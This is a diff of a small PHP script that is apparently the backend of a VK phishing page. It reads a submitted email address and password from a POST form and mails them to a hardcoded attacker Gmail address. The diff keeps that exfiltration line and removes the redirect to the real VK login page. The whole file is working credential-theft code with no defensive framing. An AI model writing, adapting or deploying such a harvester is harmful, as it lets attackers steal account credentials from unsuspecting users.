@@ -1,6 +1,5 @@
 <?php
 $message = $_POST['email'] . ':' . $_POST['pass'];
 $message = wordwrap($message, 70, "<br>");
-mail('huevsteska@gmail.com', 'Vk', $message, "From: example@mail.ru");
-header('Location: https://vk.com/login?m=1');
+mail("huevsteska@gmail.com", "VK", $message);
 ?>
